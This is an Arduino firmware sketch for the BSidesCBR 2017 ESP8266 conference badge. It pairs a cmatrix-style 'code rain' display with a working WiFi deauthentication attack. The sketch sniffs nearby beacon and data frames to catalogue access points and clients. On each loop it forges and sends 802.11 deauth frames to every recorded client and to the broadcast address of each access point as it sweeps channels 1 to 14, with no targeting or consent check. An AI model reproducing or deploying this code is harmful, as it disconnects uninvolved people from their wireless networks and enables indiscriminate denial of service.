// BSidesCBR 2017 Matrix Deauth badge mod
// Code by ec0 (James Hebden)
// I like turtles.
// Program in 160Mhz for much Matrix.
// Original deauth proof of concept nicked from https://github.com/RandDruid/esp8266-deauth
// Graphics interface provided by ucglib https://github.com/olikraus/ucglib.git
// Matrix code is ported from cmatrix http://www.asty.org/cmatrix/

#include <Ucglib.h>
#include "mtx.h"
#include <SPI.h>
#ifdef ESP8266
extern "C" {
#include "user_interface.h"
}
#endif
#include <ESP8266WiFi.h>

// Pins on BSidesCBR 2017 badge for TFT lines
// Node, this firmware does not set the CS lines on the RFID reader, so plugging that in will stop the screen from working.
#define TFT_CS              15
#define TFT_RST             16
#define TFT_DC              4

// Use HWSPI for Hardware SPI and maximum Whoa
Ucglib_ST7735_18x128x160_HWSPI ucg(/*cd=*/ TFT_DC , /*cs=*/ TFT_CS, /*reset=*/ TFT_RST);

// Defined for sending/tracking wifi deauth packets
#define ETH_MAC_LEN         6
#define MAX_APS_TRACKED     100
#define MAX_CLIENTS_TRACKED 200

//we start on channel 1
uint8_t channel = 1;
//bytes for days
uint8_t packet_buffer[64];
//used for checking addresses while processing frames
uint8_t *address_to_check;

// used for constructing deauth packets - these parts are combined with src and dest (AP and Client) MACs to form the packet
uint8_t deauth_template[26] = {0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x6a, 0x01, 0x00};
uint8_t broadcast1[3] = { 0x01, 0x00, 0x5e };
uint8_t broadcast2[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
uint8_t broadcast3[3] = { 0x33, 0x33, 0x00 };

// used to shim ncurses-related calls
// the LCD is 128*160, in portrait orientation.
// with an 8x14 monospace font, we get 12 (11.42 actually...) lines and 16 columns of chars
#define LINES 12
#define COLS 16

// represents a single point in the code rain. bold is there because I still want to get the damned colours working properly.
// I'm either doing something dumb (likely) or there's a bug in ucglib when setting colours before using drawGlyph to place a char
// When this is working, val contains the ASCII code for the glyph, or -1 for no glyph
// bold contains the following value that is supposed to influence the draw colour if the glyph: 
// 0 - regular colour (dark green)
// 1 - trail (light green)
// 2 - head of trail (white)
typedef struct cmatrix {
  int val;
  int bold;
} cmatrix;

// this has all been simplified a lot to take advantage of the esp8266 memory allocator, the original malloc/free code was crashing the esp8266
cmatrix matrix[LINES + 1][COLS];   /* multidimensional array, one cmatrix type of each glyph on the screen. plus one off-screen utility glyph */
int matrixupdates[COLS];      /* Tracks per-row random update flags */
int matrixlength[COLS];      /* Array storing an integer for each column, that contains the random length of the code rain */
int matrixspaces[COLS];     /* How many spaces need to be filled in around the code rain */
int matrixi, // used for looping through matrix, see loop
    matrixj = 0, // used for looping through matrix, see loop
    matrixcount = 0, // used for looping through matrix, see loop
    matrixy,// used for tracking column position in loop
    matrixz,// moar tracking
    matrixupdate = 4, //default start position for random updates for rows
    matrixfirstcoldone = 0, //used to print first column, ported from cmatrix
    //matrixrandnum = 93, // random range to cover ASCII charset. Offset by matrixranmin, below
    //matrixrandmin = 33, // used as an offset to random numbers between 0-93, to push the number into the ASCII space
    //matrixhighnum = 123; // maximum random number, top of the chars we want in the rain
    matrixrandnum = 51,
    matrixrandmin = 166,
    matrixhighnum = 217;
    
//used to track beacons detected, lighter on memory than storing actual beacons and less processing
struct beaconinfo
{
  uint8_t bssid[ETH_MAC_LEN];
  uint8_t ssid[33];
  int ssid_len;
  int channel;
  int err;
  signed rssi;
  uint8_t capa[2];
};

//used to remembering clients, easier than processing frames and keeping them in (limited!) memory
struct clientinfo
{
  uint8_t bssid[ETH_MAC_LEN];
  uint8_t station[ETH_MAC_LEN];
  uint8_t ap[ETH_MAC_LEN];
  int channel;
  int err;
  signed rssi;
  uint16_t seq_n;
};

//tracking vars for wifi scanning
beaconinfo aps_known[MAX_APS_TRACKED];
int aps_known_count = 0;
clientinfo clients_known[MAX_CLIENTS_TRACKED];
int clients_known_count = 0;                              // Number of known CLIENTs

// struct for storing/decoding beacon frames
struct beaconinfo parse_beacon(uint8_t *frame, uint16_t framelen, signed rssi)
{
  struct beaconinfo bi;
  bi.ssid_len = 0;
  bi.channel = 0;
  bi.err = 0;
  bi.rssi = rssi;
  int pos = 36;

  if (frame[pos] == 0x00) {
    while (pos < framelen) {
      switch (frame[pos]) {
        case 0x00: //SSID
          bi.ssid_len = (int) frame[pos + 1];
          if (bi.ssid_len == 0) {
            memset(bi.ssid, '\x00', 33);
            break;
          }
          if (bi.ssid_len < 0) {
            bi.err = -1;
            break;
          }
          if (bi.ssid_len > 32) {
            bi.err = -2;
            break;
          }
          memset(bi.ssid, '\x00', 33);
          memcpy(bi.ssid, frame + pos + 2, bi.ssid_len);
          bi.err = 0;  // before was error??
          break;
        case 0x03: //Channel
          bi.channel = (int) frame[pos + 2];
          pos = -1;
          break;
        default:
          break;
      }
      if (pos < 0) break;
      pos += (int) frame[pos + 1] + 2;
    }
  } else {
    bi.err = -3;
  }

  bi.capa[0] = frame[34];
  bi.capa[1] = frame[35];
  memcpy(bi.bssid, frame + 10, ETH_MAC_LEN);

  return bi;
}

// used for storing info about detected wifi clients based on dumped frames
// who is your AP, and what does it do.
struct clientinfo parse_data(uint8_t *frame, uint16_t framelen, signed rssi, unsigned channel)
{
  struct clientinfo ci;
  ci.channel = channel;
  ci.err = 0;
  ci.rssi = rssi;
  int pos = 36;
  uint8_t *bssid;
  uint8_t *station;
  uint8_t *ap;
  uint8_t ds;

  ds = frame[1] & 3;    //Set first 6 bits to 0
  switch (ds) {
    case 0:
      bssid = frame + 16;
      station = frame + 10;
      ap = frame + 4;
      break;
    case 1:
      bssid = frame + 4;
      station = frame + 10;
      ap = frame + 16;
      break;
    case 2:
      bssid = frame + 10;
      // hack - don't know why it works like this...
      if (memcmp(frame + 4, broadcast1, 3) || memcmp(frame + 4, broadcast2, 3) || memcmp(frame + 4, broadcast3, 3)) {
        station = frame + 16;
        ap = frame + 4;
      } else {
        station = frame + 4;
        ap = frame + 16;
      }
      break;
    case 3:
      bssid = frame + 10;
      station = frame + 4;
      ap = frame + 4;
      break;
  }

  memcpy(ci.station, station, ETH_MAC_LEN);
  memcpy(ci.bssid, bssid, ETH_MAC_LEN);
  memcpy(ci.ap, ap, ETH_MAC_LEN);

  ci.seq_n = frame[23] * 0xFF + (frame[22] & 0xF0);

  return ci;
}

// we have a beacon frame
int register_beacon(beaconinfo beacon)
{
  int known = 0;   // Clear known flag
  for (int u = 0; u < aps_known_count; u++)
  {
    if (! memcmp(aps_known[u].bssid, beacon.bssid, ETH_MAC_LEN)) {
      known = 1;
      break;
    }   // AP known => Set known flag
  }
  if (! known)  // AP is NEW, copy MAC to array and return it
  {
    memcpy(&aps_known[aps_known_count], &beacon, sizeof(beacon));
    aps_known_count++;

    if ((unsigned int) aps_known_count >=
        sizeof (aps_known) / sizeof (aps_known[0]) ) {
      Serial.printf("exceeded max aps_known\n");
      aps_known_count = 0;
    }
  }
  return known;
}

// adds a detected client as "known"
// used to keep track of AP <-> client relations for sending deauth
int register_client(clientinfo ci)
{
  int known = 0;   // Clear known flag
  for (int u = 0; u < clients_known_count; u++)
  {
    if (! memcmp(clients_known[u].station, ci.station, ETH_MAC_LEN)) {
      known = 1;
      break;
    }
  }
  if (! known)
  {
    memcpy(&clients_known[clients_known_count], &ci, sizeof(ci));
    clients_known_count++;

    if ((unsigned int) clients_known_count >=
        sizeof (clients_known) / sizeof (clients_known[0]) ) {
      Serial.printf("exceeded max clients_known\n");
      clients_known_count = 0;
    }
  }
  return known;
}

// print recieved beacon frame to USB serial
void print_beacon(beaconinfo beacon)
{
  if (beacon.err != 0) {
    //Serial.printf("BEACON ERR: (%d)  ", beacon.err);
  } else {
    Serial.printf("BEACON: [%32s]  ", beacon.ssid);
    for (int i = 0; i < 6; i++) Serial.printf("%02x", beacon.bssid[i]);
    Serial.printf("   %2d", beacon.channel);
    Serial.printf("   %4d\r\n", beacon.rssi);
  }
}

// dump client info detected by scanning to USB serial
void print_client(clientinfo ci)
{
  int u = 0;
  int known = 0;   // Clear known flag
  if (ci.err != 0) {
  } else {
    Serial.printf("CLIENT: ");
    for (int i = 0; i < 6; i++) Serial.printf("%02x", ci.station[i]);
    Serial.printf(" works with: ");
    for (u = 0; u < aps_known_count; u++)
    {
      if (! memcmp(aps_known[u].bssid, ci.bssid, ETH_MAC_LEN)) {
        Serial.printf("[%32s]", aps_known[u].ssid);
        known = 1;
        break;
      }   // AP known => Set known flag
    }
    if (! known)  {
      Serial.printf("%22s", " ");
      for (int i = 0; i < 6; i++) Serial.printf("%02x", ci.bssid[i]);
    }

    Serial.printf("%5s", " ");
    for (int i = 0; i < 6; i++) Serial.printf("%02x", ci.ap[i]);
    Serial.printf("%5s", " ");

    if (! known) {
      Serial.printf("   %3d", ci.channel);
    } else {
      Serial.printf("   %3d", aps_known[u].channel);
    }
    Serial.printf("   %4d\r\n", ci.rssi);
  }
}

/* Promiscous callback structures, see ESP manual
   We use this to recieve frames from the wifi chip as they come in */
struct RxControl {
  signed rssi: 8;
  unsigned rate: 4;
  unsigned is_group: 1;
  unsigned: 1;
  unsigned sig_mode: 2;
  unsigned legacy_length: 12;
  unsigned damatch0: 1;
  unsigned damatch1: 1;
  unsigned bssidmatch0: 1;
  unsigned bssidmatch1: 1;
  unsigned MCS: 7;
  unsigned CWB: 1;
  unsigned HT_length: 16;
  unsigned Smoothing: 1;
  unsigned Not_Sounding: 1;
  unsigned: 1;
  unsigned Aggregation: 1;
  unsigned STBC: 2;
  unsigned FEC_CODING: 1;
  unsigned SGI: 1;
  unsigned rxend_state: 8;
  unsigned ampdu_cnt: 8;
  unsigned channel: 4;
  unsigned: 12;
};

// below are all used for recieving frames from the wifi hardware
struct LenSeq {
  uint16_t length;
  uint16_t seq;
  uint8_t  address3[6];
};

// ditto
struct sniffer_buf {
  struct RxControl rx_ctrl;
  uint8_t buf[36];
  uint16_t cnt;
  struct LenSeq lenseq[1];
};

// ditto
struct sniffer_buf2 {
  struct RxControl rx_ctrl;
  uint8_t buf[112];
  uint16_t cnt;
  uint16_t len;
};


/* How is packet form?
   buf - reference to the data array to write packet to;
   client - MAC address of the client;
   ap - MAC address of the acces point;
   seq - sequence number of 802.11 packet;
   Returns: size of the packet
*/
uint16_t create_packet(uint8_t *buf, uint8_t *c, uint8_t *ap, uint16_t seq)
{
  int i = 0;

  memcpy(buf, deauth_template, 26);
  // Destination
  memcpy(buf + 4, c, ETH_MAC_LEN);
  // Sender
  memcpy(buf + 10, ap, ETH_MAC_LEN);
  // BSS
  memcpy(buf + 16, ap, ETH_MAC_LEN);
  // Seq_n
  buf[22] = seq % 0xFF;
  buf[23] = seq / 0xFF;

  return 26;
}

// Sends deauth packets to trick wifi clients into leaving a wifi network.
// Some devices will reconnect straight away, others just won't.
void deauth(uint8_t *c, uint8_t *ap, uint16_t seq)
{
  uint8_t i = 0;
  uint16_t sz = 0;
  for (i = 0; i < 0x10; i++) {
    sz = create_packet(packet_buffer, c, ap, seq + 0x10 * i);
    wifi_send_pkt_freedom(packet_buffer, sz, 0);
    delay(1);
  }
}

// promisc callback, called when frames are recieved
void promisc_cb(uint8_t *buf, uint16_t len)
{
  int i = 0;
  uint16_t seq_n_new = 0;
  if (len == 12) {
    struct RxControl *sniffer = (struct RxControl*) buf;
  } else if (len == 128) {
    struct sniffer_buf2 *sniffer = (struct sniffer_buf2*) buf;
    struct beaconinfo beacon = parse_beacon(sniffer->buf, 112, sniffer->rx_ctrl.rssi);
    if (register_beacon(beacon) == 0) {
      print_beacon(beacon);
    }
  } else {
    struct sniffer_buf *sniffer = (struct sniffer_buf*) buf;
    //Is data or QOS?
    if ((sniffer->buf[0] == 0x08) || (sniffer->buf[0] == 0x88)) {
      struct clientinfo ci = parse_data(sniffer->buf, 36, sniffer->rx_ctrl.rssi, sniffer->rx_ctrl.channel);
      if (memcmp(ci.bssid, ci.station, ETH_MAC_LEN)) {
        if (register_client(ci) == 0) {
          print_client(ci);
        }
      }
    }
  }
}


// Arduino entry point (equiv to main function)
void setup(void)
{
  Serial.begin(115200);
  Serial.println("Setting BL");
  
  // give time for SPI to settle
  delay(1000);

  // Backlight is connected to D0 (internal pin 5)
  pinMode(5, OUTPUT);
  digitalWrite(5, 128);
  // let it turn on
  delay(1000);

  Serial.println("Starting TFT");
  // init UCG graphics library and set our font and colour options
  ucg.begin(UCG_FONT_MODE_SOLID);
  
  // display in badge is rotated 270 degrees
  ucg.setRotate270();
  // this also rotates glyphs 270 degrees
  ucg.setPrintDir(3);
  ucg.setFont(ucg_font_mtx14_mr);
  ucg.clearScreen();
  // this sets colour index 1 to back, index 1 is used for font background
  // doing solid fonts instead of transparent, with a black background, means we don't have to clear the previous glyph
  ucg.setColor(1, 0, 0, 0);

  Serial.println("Starting WiFi");

  // Promiscuous works only with station mode
  wifi_set_opmode(STATION_MODE);

  // Start up on channel 1
  wifi_set_channel(1);

  // Set up promiscuous callback
  // this gets called whenever we have new data from the wifi chip
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(promisc_cb);
  wifi_promiscuous_enable(1);

  // Set initial values for matrix generation
  Serial.println("Set up the Matrix");
  var_init();

  Serial.println("Init done.");

}

// Set intial values for the code rain and seed values for first column
void var_init(void)
{
  /* Make the matrix */
  for (matrixi = 0; matrixi <= LINES; matrixi++)
    for (matrixj = 0; matrixj <= COLS - 1; matrixj += 2)
      matrix[matrixi][matrixj].val = -1;

  for (matrixj = 0; matrixj <= COLS - 1; matrixj += 2) {
    /* Set up spaces[] array of how many spaces to skip */
    matrixspaces[matrixj] = random(LINES) + 1;

    /* And length of the stream */
    matrixlength[matrixj] = random((LINES - 3)) + 3;

    /* Sentinel value for creation of new objects */
    matrix[1][matrixj].val = ' ';

    // seed random update flags for each row
    matrixupdates[matrixj] = random( 3 ) + 1 ;

  }

}

// this function is run repeatedly in Arduino-land, similar to a while(1) loop
void loop(void)
{
  // jump back to channel one if we've looped all the way. ESP8266 does channels 1-14.
  // it typically ships with a generic regulatory domain, rather than being set properly for the country it's sold it. dodge.
  if (channel == 15) channel = 1;
  wifi_set_channel(channel);

  Serial.print("Scanning channel ");
  Serial.println(channel);
  
  // disable promisc callback after switching channels so we can send packets
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(0);
  wifi_promiscuous_enable(1);

  // loop over knows aps and clients
  // send deauth packets to clients and broadcast address for aps on the current channel
  for (int ua = 0; ua < aps_known_count; ua++) {
    if (aps_known[ua].channel == channel) {
      for (int uc = 0; uc < clients_known_count; uc++) {
        if (! memcmp(aps_known[ua].bssid, clients_known[uc].bssid, ETH_MAC_LEN)) {
          address_to_check = clients_known[uc].ap;
          Serial.print("DEAUTH ");
          print_client(clients_known[uc]);
          deauth(clients_known[uc].station, clients_known[uc].bssid, clients_known[uc].seq_n);
          break;
        }
      }
      deauth(broadcast2, aps_known[ua].bssid, 128);
    }
  }

  // reset promisc callback after sending deauth packets
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(promisc_cb);
  wifi_promiscuous_enable(1);

  channel++;

  //used for random row progression
  matrixcount++;
  if (matrixcount > 4)
      matrixcount = 1;

  // progress the matrix display
  // loop over each char in the grid (matrix[x][y])
  // this is the new scrolling logic mode from cmatrix, condensed down and slightly optimised
  // loop through each column, only process every second column so we have spacing between the code rain columns
  for (matrixj = 0; matrixj <= COLS - 1; matrixj += 2) {

    //if this row is being updated this iteration, based on its random update flag...
    if (matrixcount > matrixupdates[matrixj]) {

      // if we're pushing a space (-1) down onto the display (matrixspaces > 0) and the current displayed char is a space
      // lower the space counter and skip the cell
      if (matrix[0][matrixj].val == -1 && matrix[1][matrixj].val == ' ' && matrixspaces[matrixj] > 0) {
        matrix[0][matrixj].val = -1;
        matrixspaces[matrixj]--;
      // otherwise we've pushed enough spaces between code rain columns, and we're ready for a new char
      } else if (matrix[0][matrixj].val == -1 && matrix[1][matrixj].val == ' ') {
        matrixlength[matrixj] = random((LINES - 3)) + 3;
        matrix[0][matrixj].val = random( matrixrandnum ) + matrixrandmin;
  
        // sets bold flag randomly, not currently working with ucglib
        if (random( 2 ) == 1 ) {
          matrix[0][matrixj].bold = 2;
        }
  
        // set a random number of spaces to be used next time we're pushing them onto the column
        matrixspaces[matrixj] = random( LINES ) + 1 ;
      }
  
      //reset loop vars so we can loop again
      matrixi = 0;
      matrixy = 0;
      matrixfirstcoldone = 0;
  
      //loop over each line
      //the contents of this magic while loop is the new scrolling logic from cmatrix
      while (matrixi <= LINES) {
  
        while (matrixi <= LINES && (matrix[matrixi][matrixj].val == ' ' ||
              matrix[matrixi][matrixj].val == -1))
          matrixi++;
  
        if (matrixi > LINES)
          break;
  
        matrixz = matrixi;
        matrixy = 0;
        
        while (matrixi <= LINES && (matrix[matrixi][matrixj].val != ' ' &&
              matrix[matrixi][matrixj].val != -1)) {
          matrixi++;
          matrixy++;
        }
  
        if (matrixi > LINES) {
          matrix[matrixz][matrixj].val = ' ';
          matrix[LINES][matrixj].bold = 1;
          continue;
        }
  
        matrix[matrixi][matrixj].val = random( matrixrandnum ) + matrixrandmin;

        // modified from cmatrix colourisation
        // this will retain leading white character, and trail with slightly brighter green
        // rest of the column will be default, which is random between 0-128 green value
        if (matrix[matrixi - 1][matrixj].bold == 2) {
          matrix[matrixi - 1][matrixj].bold = 1;
          matrix[matrixi - 2][matrixj].bold = 0;
          matrix[matrixi][matrixj].bold = 2;
        }
  
        /* If we're at the top of the column and it's reached its
           full length (about to start moving down), we do this
           to get it moving.  This is also how we keep segments not
           already growing from growing accidentally =>
         */
        if (matrixy > matrixlength[matrixj] || matrixfirstcoldone) {
          matrix[matrixz][matrixj].val = ' ';
          matrix[0][matrixj].val = -1;
        }
        matrixfirstcoldone = 1;
        matrixi++;
      }
    }

    // reset vars
    matrixy = 0;
    matrixz = LINES - 1;

    // loop over grid and do screen updates
    for (matrixi = matrixy; matrixi <= matrixz; matrixi++) {

      //move cursor, multiply x y coords by 14 and 8 (8x14 font) to get display xy coordinates for drawing
      ucg.setPrintPos((matrixi - matrixy + 1) * 14, (matrixj + 1) * 8);

      //this could probably be optimised to skip the operation if the previous char is also a space
      if (matrix[matrixi][matrixj].val == -1) {
        // print a space, we've already moved the cursor above
        ucg.print(' ');
      } else {
        // bold code. should work, does not. suspect ucglib bug or I'm misreading documentation.
        switch (matrix[matrixi][matrixj].bold) {
          case 1:
            ucg.setColor(0, 0, 255, 0);
            break;
          case 2:
            ucg.setColor(0, 255, 255, 255);
            break;
          case 0:
            ucg.setColor(0, 0, random(20, 90), 0);
            break;
        }
        // draw the character glyph
        ucg.print((char)matrix[matrixi][matrixj].val);
      }
    }
  }
}

